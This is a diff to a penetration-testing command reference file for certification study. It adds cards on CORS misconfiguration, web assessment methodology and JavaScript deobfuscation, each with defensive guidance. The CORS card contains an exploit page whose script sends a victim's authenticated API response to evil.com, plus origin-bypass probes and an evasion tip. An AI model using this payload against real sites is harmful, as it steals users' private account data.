@@ -10704,6 +10704,114 @@ const COMMAND_DATA = {
       "type": "command"
     },
     {
+      "id": "cors-misconfiguration",
+      "name": "CORS Misconfiguration - Cross-Origin Data Theft",
+      "command": "curl -s -I -H \"Origin: https://evil.com\" https://<target>/api/account",
+      "description": "A permissive CORS policy that reflects an attacker origin AND allows credentials lets a malicious page read authenticated responses from the victim's browser. Test by sending a rogue Origin and checking whether it is reflected in Access-Control-Allow-Origin with Access-Control-Allow-Credentials: true (CWES M18).",
+      "platform": "linux",
+      "requires": [
+        "network-access"
+      ],
+      "protocols": [
+        "http"
+      ],
+      "tools": [
+        "curl"
+      ],
+      "tags": [
+        "cors",
+        "api",
+        "cross-origin",
+        "acao",
+        "credentials",
+        "web"
+      ],
+      "category": "Web Exploitation",
+      "subcategory": "API Attacks",
+      "certifications": [
+        "CWES"
+      ],
+      "primary_cert": "CWES",
+      "source": "CWES Module 18: API Attacks",
+      "opsec": "quiet",
+      "exam": "exam-ok",
+      "mitre": [
+        "T1190",
+        "T1539"
+      ],
+      "steps": [
+        {
+          "label": "Test 1: does the server reflect an arbitrary Origin?",
+          "command": "curl -s -I -H 'Origin: https://evil.com' https://<target>/api/account | grep -i 'access-control-allow-'"
+        },
+        {
+          "label": "Vulnerable if you see reflected origin + credentials allowed",
+          "command": "# Access-Control-Allow-Origin: https://evil.com\n# Access-Control-Allow-Credentials: true   <-- exploitable"
+        },
+        {
+          "label": "Test 2: null-origin trust (sandboxed iframe / redirects)",
+          "command": "curl -s -I -H 'Origin: null' https://<target>/api/account | grep -i 'access-control-allow-origin'"
+        },
+        {
+          "label": "Host the exploit page and lure an authenticated victim",
+          "command": "python3 -m http.server 80   # serve the HTML below"
+        }
+      ],
+      "examples": [
+        {
+          "label": "Exploit page: steal the victim's authenticated response",
+          "command": "<script>\nfetch('https://<target>/api/account',{credentials:'include'})\n  .then(r=>r.text())\n  .then(d=>fetch('https://evil.com/log?d='+encodeURIComponent(btoa(d))));\n</script>"
+        },
+        {
+          "label": "Weak regex bypass: trusted-suffix / substring match",
+          "command": "curl -s -I -H 'Origin: https://evil-<target>' https://<target>/api/account   # or https://<target>.evil.com"
+        }
+      ],
+      "notes": "Three common broken patterns: (1) blind reflection of the Origin header into ACAO + ACAC:true = full cross-origin credentialed read (worst). (2) ACAO: null trusted = exploitable from a sandboxed iframe (<iframe sandbox=allow-scripts srcdoc=...>) which sends Origin: null. (3) weak origin validation (startswith/endswith/substring) - bypass with evil-<target>.com or <target>.evil.com. Impact needs ACAC:true (or a token the page can read) to steal authenticated data; without credentials it only exposes public data. Distinct from CSRF: CORS lets the attacker READ the response, CSRF only lets them send a request. Wildcard ACAO (*) cannot be combined with ACAC:true by spec, so pure * is lower risk.",
+      "references": [
+        {
+          "title": "HTB Academy - API Attacks",
+          "url": "https://academy.hackthebox.com/module/details/305"
+        },
+        {
+          "title": "PortSwigger - CORS",
+          "url": "https://portswigger.net/web-security/cors"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "api-enum-abuse",
+          "note": "Enumerate the API surface first",
+          "rel": "prereq"
+        }
+      ],
+      "variations": [
+        {
+          "label": "Enumerate CORS on many endpoints (spot the reflective ones)",
+          "command": "for e in account profile orders admin; do echo \"/$e:\"; curl -s -I -H 'Origin: https://evil.com' https://<target>/api/$e | grep -i access-control-allow-origin; done"
+        }
+      ],
+      "defense": {
+        "why_it_works": "CORS relaxes the Same-Origin Policy by letting the server declare which origins may read cross-origin responses. If the server reflects the request's Origin into Access-Control-Allow-Origin and also sets Access-Control-Allow-Credentials: true, any attacker-controlled page can make the victim's browser send its cookies to the target and read the authenticated response - defeating SOP for that endpoint.",
+        "prerequisites": "An endpoint that returns sensitive data based on the session cookie AND reflects arbitrary origins with credentials allowed (or trusts null / uses weak origin validation). A victim who visits the attacker's page while authenticated.",
+        "impact": "T1190 Exploit Public-Facing Application + T1539 Steal Web Session Cookie (effectively - reading authenticated data cross-origin). Theft of PII, tokens, or account data from any logged-in victim who opens the attacker page.",
+        "detection": "Requests carrying an external/attacker Origin header to sensitive endpoints; responses reflecting non-allowlisted origins; spikes of cross-origin credentialed requests. WAF rules matching unexpected Origin values.",
+        "artifacts": "Access logs: requests with Origin: https://evil.com (or null) to authenticated API paths; the reflected ACAO in responses.",
+        "prevention": "Use a strict server-side allowlist of exact trusted origins - never reflect the Origin header. Do not set Access-Control-Allow-Credentials: true unless required, and never with a reflected/wildcard origin. Reject Origin: null. Validate origins with exact match, not startswith/endswith/substring. Prefer same-site cookies (SameSite=Strict/Lax) as defense in depth.",
+        "evasion": "Use a plausible-looking origin that passes weak validation (trusted substring/suffix). Keep the exfil beacon small and to a benign-looking host.",
+        "sources": [
+          "HTB CWES M18",
+          "MITRE T1190",
+          "MITRE T1539",
+          "https://portswigger.net/web-security/cors"
+        ],
+        "misconfiguration": "Server reflects the Origin header into ACAO with ACAC:true, trusts Origin: null, or validates origins by substring/suffix instead of exact allowlist.",
+        "vulnerable_config": "// Express - reflects any origin WITH credentials (critical):\napp.use((req,res,next)=>{\n  res.header('Access-Control-Allow-Origin', req.headers.origin);\n  res.header('Access-Control-Allow-Credentials','true');\n  next();\n});",
+        "secure_config": "// Strict allowlist, exact match, no credential+reflection:\nconst allow = new Set(['https://app.example.com']);\napp.use((req,res,next)=>{\n  const o = req.headers.origin;\n  if (allow.has(o)) {\n    res.header('Access-Control-Allow-Origin', o);\n    res.header('Access-Control-Allow-Credentials','true');\n    res.header('Vary','Origin');\n  }\n  next();\n});\n// Reject 'null'; set cookies SameSite=Lax/Strict."
+      },
+      "type": "command"
+    },
+    {
       "id": "cpts-exam-methodology",
       "name": "CPTS Exam Methodology & Playbook",
       "command": "# Loop: Recon -> Initial Access -> Pillage -> PrivEsc -> Loot -> AD -> Lateral -> Pivot -> (repeat) -> Report",
@@ -14014,6 +14122,114 @@ const COMMAND_DATA = {
         {
           "label": "Run the arbitrary-file-move exploit",
           "command": "CVE-2020-0668.exe <payload_exe> \"<protected_target_path>\""
+        }
+      ]
+    },
+    {
+      "id": "cwes-methodology",
+      "name": "CWES / Web Assessment Methodology & Playbook",
+      "command": "# Flow: Recon/Map -> Fingerprint -> Test each vuln class -> Chain -> Score (CVSS) -> Report",
+      "description": "Orientation for the CWES exam and web assessments: how to work a web target end to end - map it, fingerprint the stack, test each vulnerability class in a sensible order, chain findings, and write them up with CVSS. Open this when you start a target or get stuck.",
+      "platform": "multi",
+      "type": "reference",
+      "category": "Web Exploitation",
+      "subcategory": "Methodology",
+      "certifications": [
+        "CWES"
+      ],
+      "primary_cert": "CWES",
+      "source": "CWES Module 20: Bug Bounty Hunting Process",
+      "opsec": "quiet",
+      "exam": "exam-ok",
+      "mitre": [
+        "T1595.003",
+        "T1190"
+      ],
+      "tags": [
+        "methodology",
+        "playbook",
+        "web",
+        "cwes",
+        "bug-bounty",
+        "checklist"
+      ],
+      "tools": [
+        "burpsuite",
+        "ffuf",
+        "sqlmap",
+        "curl"
+      ],
+      "steps": [
+        {
+          "label": "1. Recon & mapping (know the surface before attacking)",
+          "command": "# Subdomains/vhosts, crawl, robots.txt, sitemap, JS files. Cards: gs-web-recon, ffuf-subdomain, ffuf-vhost, web-crawling, js-deobfuscate (endpoints/secrets in JS), web-archives."
+        },
+        {
+          "label": "2. Fingerprint the stack",
+          "command": "# Server, framework, CMS, WAF. Cards: web-fingerprinting, wafw00f, whatweb, wpscan/joomla/drupal detect, cms discovery."
+        },
+        {
+          "label": "3. Content & parameter discovery",
+          "command": "# Directories, files, params, values. Cards: ffuf-directory, ffuf-page-extension, ffuf-parameter, ffuf-value, fuzzer-flags-ref (filtering)."
+        },
+        {
+          "label": "4. Test each vulnerability class (inject where input is reflected/used)",
+          "command": "# SQLi (sqli-*, sqlmap-*), XSS (xss-*), cmd injection (cmdi-*), file inclusion (lfi-*/rfi), file upload (upload-*), SSRF/SSTI/SSI/XSLT (ssrf-*/ssti-*), XXE (xxe-*), IDOR (idor-*), auth (auth-*/login brute), GraphQL (graphql-*), API (api-*/cors-misconfiguration)."
+        },
+        {
+          "label": "5. Broken auth & access control (high-value, often overlooked)",
+          "command": "# JWT flaws, weak reset/2FA, session issues, IDOR, mass assignment, CORS. Cards: auth-*, idor-*, mass-assignment, cors-misconfiguration."
+        },
+        {
+          "label": "6. Chain findings for impact",
+          "command": "# e.g. reflected value in JS -> parameter -> SQLi -> file write -> RCE; or XSS -> CSRF admin create -> takeover; or SSRF -> cloud metadata. Follow each card's 'recommended' links."
+        },
+        {
+          "label": "7. Score with CVSS + write the finding",
+          "command": "# ref-cvss card / CVSS calculator; then title, impact, steps-to-reproduce, evidence, remediation. Cards: ref-cvss, report-components."
+        }
+      ],
+      "examples": [
+        {
+          "label": "Quick reflect test across a parameter (spot injectable classes)",
+          "command": "curl -s \"http://<target>/page?q=cwestest'\\\"<x>\" | grep -o 'cwestest[^ <]*'"
+        },
+        {
+          "label": "When stuck: pull endpoints/secrets out of the site's JS",
+          "command": "curl -s http://<target>/js/main.js | js-beautify - | grep -oiE '/api/[a-z0-9_/.-]+|apikey|token'"
+        }
+      ],
+      "notes": "ORDER: map -> fingerprint -> discover content/params -> test each class -> chain -> score -> report. WEB TESTING PRIORITIES: test EVERY input (URL, params, headers, cookies, JSON body, file names/metadata) for each class; a value reflected in the response = XSS candidate, a value used in a query/file/command/URL = SQLi/LFI/cmdi/SSRF candidate. HIGH-VALUE, OFTEN-MISSED: IDOR (increment/enumerate object IDs), broken auth (JWT alg/none, weak reset tokens, 2FA bypass), CORS (reflective origin + credentials), mass assignment (add admin=true), GraphQL introspection. CHAIN for impact - a lone reflected XSS scores low, but XSS->admin CSRF->RCE is critical; SSRF->cloud metadata->creds is critical. CVSS: score base metrics honestly (AV/AC/PR/UI/S/C/I/A); mark scope-changed when you pivot trust boundaries. REPORT: title, severity+CVSS vector, impact, reproducible steps, evidence, remediation. LINKED CARDS: search the ids named per step.",
+      "references": [
+        {
+          "title": "HTB Academy - Bug Bounty Hunting Process",
+          "url": "https://academy.hackthebox.com/module/details/159"
+        },
+        {
+          "title": "OWASP Web Security Testing Guide",
+          "url": "https://owasp.org/www-project-web-security-testing-guide/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "js-deobfuscate",
+          "note": "Recon: recover hidden endpoints/secrets from client JS",
+          "rel": "next"
+        },
+        {
+          "id": "ffuf-parameter",
+          "note": "Discover hidden parameters to test",
+          "rel": "next"
+        },
+        {
+          "id": "cors-misconfiguration",
+          "note": "High-value broken-access-control class",
+          "rel": "next"
+        },
+        {
+          "id": "ref-cvss",
+          "note": "Score findings for the report",
+          "rel": "next"
         }
       ]
     },
@@ -31499,6 +31715,134 @@ const COMMAND_DATA = {
           "PEN-200 Ch 6"
         ]
       }
+    },
+    {
+      "id": "js-deobfuscate",
+      "name": "JavaScript Deobfuscation - Recover Endpoints & Secrets",
+      "command": "curl -s http://<target>/js/<file>.js | js-beautify -",
+      "description": "Client-side JS often hides API endpoints, hardcoded credentials/keys, hidden parameters, and logic behind minification, packing, or obfuscation. Beautify then deobfuscate it to recover the real code, then follow the endpoints/secrets you find. A core web-recon step (CWES M06).",
+      "platform": "linux",
+      "requires": [
+        "network-access"
+      ],
+      "protocols": [
+        "http"
+      ],
+      "tools": [
+        "js-beautify",
+        "prettier",
+        "curl",
+        "CyberChef"
+      ],
+      "tags": [
+        "javascript",
+        "deobfuscation",
+        "web-recon",
+        "beautify",
+        "secrets",
+        "endpoints"
+      ],
+      "category": "Web Exploitation",
+      "subcategory": "JavaScript Deobfuscation",
+      "certifications": [
+        "CWES",
+        "CPTS"
+      ],
+      "primary_cert": "CWES",
+      "source": "CWES Module 06: JavaScript Deobfuscation",
+      "opsec": "quiet",
+      "exam": "exam-ok",
+      "mitre": [
+        "T1592.002",
+        "T1140"
+      ],
+      "steps": [
+        {
+          "label": "Pull the script and beautify it (undo minify/pack)",
+          "command": "curl -s http://<target>/js/main.js | js-beautify - > main.pretty.js"
+        },
+        {
+          "label": "Deobfuscate packed/obfuscated code (eval/packer/hex arrays)",
+          "command": "# paste into https://deobfuscate.io or de4js; or use CyberChef 'JavaScript Beautify' + 'Decode' recipe"
+        },
+        {
+          "label": "Grep the recovered code for endpoints, params, secrets",
+          "command": "grep -oiE \"(/api/[a-z0-9_/.-]+|https?://[^'\\\"]+|apikey|api_key|token|secret|password|bearer)\" main.pretty.js | sort -u"
+        },
+        {
+          "label": "Replay a discovered endpoint",
+          "command": "curl -s -X POST http://<target>/api/<hidden_endpoint> -H 'Content-Type: application/json' -d '{}'"
+        }
+      ],
+      "examples": [
+        {
+          "label": "Decode a base64 string found in the JS",
+          "command": "echo '<b64_string>' | base64 -d"
+        },
+        {
+          "label": "Decode hex-encoded strings",
+          "command": "echo '<hex>' | xxd -r -p"
+        },
+        {
+          "label": "Rot13 (Caesar) decode",
+          "command": "echo '<text>' | tr 'A-Za-z' 'N-ZA-Mn-za-m'"
+        }
+      ],
+      "notes": "M06 flow: minify/pack/obfuscate are reversible - beautify (prettier / js-beautify / CyberChef 'JavaScript Beautify') to restore structure, then deobfuscate (de4js, deobfuscate.io, or manually resolve packer arrays and eval() chains). Common hidden loot: undocumented /api/ routes, hardcoded API keys/JWTs, hidden form fields, debug flags, client-side auth checks (bypassable). Encodings seen in the module: Base64 (atob/btoa), Hex, Caesar/Rot13, char-code arrays (String.fromCharCode / charCodeAt). Always diff the deobfuscated logic for client-side 'security' you can simply skip server-side. Blue-team JS deobf (malware) is a different context - see cdsa-m11 cards.",
+      "references": [
+        {
+          "title": "HTB Academy - JavaScript Deobfuscation",
+          "url": "https://academy.hackthebox.com/module/details/41"
+        },
+        {
+          "title": "de4js",
+          "url": "https://lelinhtinh.github.io/de4js/"
+        },
+        {
+          "title": "CyberChef",
+          "url": "https://gchq.github.io/CyberChef/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "gs-web-recon",
+          "note": "Broader web recon / fingerprinting",
+          "rel": "prereq"
+        },
+        {
+          "id": "ffuf-parameter",
+          "note": "Fuzz the hidden parameters you recovered from the JS",
+          "rel": "next"
+        }
+      ],
+      "variations": [
+        {
+          "label": "Beautify with prettier",
+          "command": "prettier --parser babel main.js > main.pretty.js"
+        },
+        {
+          "label": "Find all script sources on a page",
+          "command": "curl -s http://<target>/ | grep -oE 'src=\"[^\"]+\\.js\"' | cut -d'\"' -f2"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Obfuscation and minification only transform JavaScript for size/readability - they are fully reversible and provide no security. Anything shipped to the browser (endpoints, keys, logic, 'hidden' fields) is recoverable by beautifying and decoding, because the client must ultimately execute the real code.",
+        "prerequisites": "Access to the application's client-side JavaScript (any visitor has it). Beautifier/deobfuscator (js-beautify, prettier, de4js, CyberChef).",
+        "impact": "T1592.002 Gather Victim Host Information: Software + T1140 Deobfuscate/Decode Information. Recovers hidden API endpoints, hardcoded secrets/keys/JWTs, and client-side logic - directly expands attack surface and can yield immediate credential/API access.",
+        "detection": "Largely client-side (no server signal for beautifying). Follow-on requests to newly-discovered hidden endpoints may appear in access logs. Hardcoded-key reuse from a client can be detected by anomalous key usage.",
+        "artifacts": "Requests to endpoints only referenced inside JS; use of API keys that were embedded in client code.",
+        "prevention": "Never ship secrets/keys in client-side code - keep them server-side. Do not rely on obfuscation for security. Enforce all authorization server-side (client checks are advisory). Rotate any key ever exposed in client code. Scope client API keys minimally.",
+        "evasion": "Purely local analysis - nothing to evade until you act on the findings; then throttle/scope requests to discovered endpoints.",
+        "sources": [
+          "HTB CWES M06",
+          "MITRE T1140",
+          "MITRE T1592.002"
+        ],
+        "misconfiguration": "Secrets, API keys, or authorization logic placed in client-side JavaScript under the assumption that obfuscation/minification hides them.",
+        "vulnerable_config": "// shipped app.js (minified/obfuscated but recoverable):\nconst API_KEY='sk_live_2b9...';\nfetch('/api/admin/users',{headers:{'x-api-key':API_KEY}})\n// beautify -> key + hidden /api/admin/ endpoint recovered by any visitor",
+        "secure_config": "// Keep secrets server-side; proxy privileged calls through the backend.\n// Client holds NO API keys; the server authenticates the session and authorizes each action.\n// Treat all client code as public; enforce authZ server-side; rotate leaked keys."
+      },
+      "type": "command"
     },
     {
       "id": "cdsa-m11-js-obfuscation",
@@ -91831,8 +92175,8 @@ const COMMAND_DATA = {
       ]
     }
   ],
-  "totalCommands": 914,
-  "buildDate": "2026-09-09T10:05:42.184Z",
+  "totalCommands": 917,
+  "buildDate": "2026-09-09T11:11:12.512Z",
   "certifications": [
     "CDSA",
     "CPTS",
